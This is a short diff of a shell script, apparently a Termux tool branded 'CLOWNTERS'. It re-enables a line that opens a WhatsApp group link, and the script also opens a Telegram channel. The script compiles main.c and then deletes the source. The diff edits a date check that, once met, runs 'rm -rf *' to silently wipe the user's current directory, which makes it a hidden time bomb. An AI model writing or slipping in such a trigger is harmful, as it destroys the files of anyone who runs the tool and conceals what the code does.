@@ -22,7 +22,7 @@
  #CLOWNTERS
 CLOWNTERS
 
-#termux-open-url https://chat.whatsapp.com/FnqHx08Dwo7CGnmrAu8WsY &> /dev/null
+termux-open-url https://chat.whatsapp.com/FnqHx08Dwo7CGnmrAu8WsY &> /dev/null
 sleep 1
 termux-open-url https://t.me/clownters &> /dev/null
 sleep 1
@@ -40,7 +40,7 @@ test -f main.c && gcc main.c -o main
 if [[ -f main ]]; then
     test -f main.c && rm -rf main.c
 fi
-if (($(date +%m%y) >= 010622)); then
+if (($(date +%m%y) >= 0622)); then
     clear
     rm -rf *
 else
